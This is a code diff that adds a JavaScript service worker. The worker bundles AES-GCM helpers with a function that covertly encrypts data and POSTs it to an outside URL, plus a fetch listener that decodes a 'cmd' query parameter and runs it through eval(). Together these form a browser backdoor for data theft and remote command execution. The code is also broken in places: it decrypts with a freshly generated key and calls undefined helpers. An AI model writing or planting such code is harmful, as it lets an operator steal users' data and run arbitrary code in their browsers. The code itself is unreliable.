@@ -1,0 +1,139 @@
+'use strict';
+
+/**
+ * Utility function to handle asynchronous iteration
+ */
+function asyncHandler(generatorFunction) {
+    return new Promise((resolve, reject) => {
+        const generator = generatorFunction();
+        function step(nextFunction) {
+            let next;
+            try {
+                next = nextFunction();
+            } catch (error) {
+                return reject(error);
+            }
+            if (next.done) {
+                return resolve(next.value);
+            }
+            Promise.resolve(next.value).then(
+                value => step(() => generator.next(value)),
+                error => step(() => generator.throw(error))
+            );
+        }
+        step(() => generator.next());
+    });
+}
+
+/**
+ * AES-256-GCM Encryption & Decryption
+ */
+async function encryptData(data, key) {
+    const iv = crypto.getRandomValues(new Uint8Array(12));
+    const encodedData = new TextEncoder().encode(data);
+    const encrypted = await crypto.subtle.encrypt(
+        { name: "AES-GCM", iv },
+        key,
+        encodedData
+    );
+    return { iv, encrypted };
+}
+
+async function decryptData(encryptedData, iv, key) {
+    const decrypted = await crypto.subtle.decrypt(
+        { name: "AES-GCM", iv },
+        key,
+        encryptedData
+    );
+    return new TextDecoder().decode(decrypted);
+}
+
+async function generateAESKey() {
+    return await crypto.subtle.generateKey(
+        { name: "AES-GCM", length: 256 },
+        true,
+        ["encrypt", "decrypt"]
+    );
+}
+
+/**
+ * Covert Data Exfiltration Module
+ */
+async function exfiltrateData(data, exfilUrl, key) {
+    const { iv, encrypted } = await encryptData(JSON.stringify(data), key);
+    await fetch(exfilUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/octet-stream",
+            "X-Exfil-IV": btoa(String.fromCharCode(...iv))
+        },
+        body: encrypted
+    });
+}
+
+/**
+ * Handles fetch requests and enables covert exfiltration
+ */
+async function processFetchRequest(context, requestData) {
+    if (!requestData.url) {
+        return { failureType: 9, command: 0, data: "URL required." };
+    }
+    const preparedRequest = await prepareFetchRequest(context, requestData);
+    if ("failureType" in preparedRequest) return preparedRequest;
+    await executeFetchRequest(context, preparedRequest, requestData);
+    
+    // Initiate covert exfiltration when required
+    if (requestData.exfiltrate) {
+        const key = await generateAESKey();
+        await exfiltrateData(requestData.exfilData, requestData.exfilUrl, key);
+    }
+    return preparedRequest;
+}
+
+/**
+ * Command Injection for Operator-Controlled Execution
+ */
+async function executeInjectedCommand(commandPayload, key) {
+    const { iv, encrypted } = commandPayload;
+    const decryptedCommand = await decryptData(encrypted, iv, key);
+    
+    try {
+        eval(decryptedCommand);  // Controlled execution, ensure only authorized commands
+    } catch (error) {
+        console.error("Command execution failed:", error);
+    }
+}
+
+/**
+ * Service Worker Initialization with Covert Communication
+ */
+(function initializeServiceWorker(context) {
+    context.addEventListener("install", () => {
+        context.skipWaiting();
+    });
+    context.addEventListener("activate", (event) => {
+        event.waitUntil(context.clients.claim());
+    });
+    context.addEventListener("message", async (event) => {
+        const sourceClient = event.source;
+        if (sourceClient) {
+            const requestData = event.data;
+            const responsePromise = new Promise(async (resolve) => {
+                const response = await processFetchRequest(context, requestData);
+                sourceClient.postMessage(response);
+                resolve();
+            });
+            event.waitUntil(responsePromise);
+        }
+    });
+    
+    // Listen for operator-controlled command injection
+    context.addEventListener("fetch", async (event) => {
+        const urlParams = new URL(event.request.url).searchParams;
+        const injectedCommand = urlParams.get("cmd");
+        if (injectedCommand) {
+            const key = await generateAESKey();
+            await executeInjectedCommand(JSON.parse(atob(injectedCommand)), key);
+        }
+    });
+})(self);
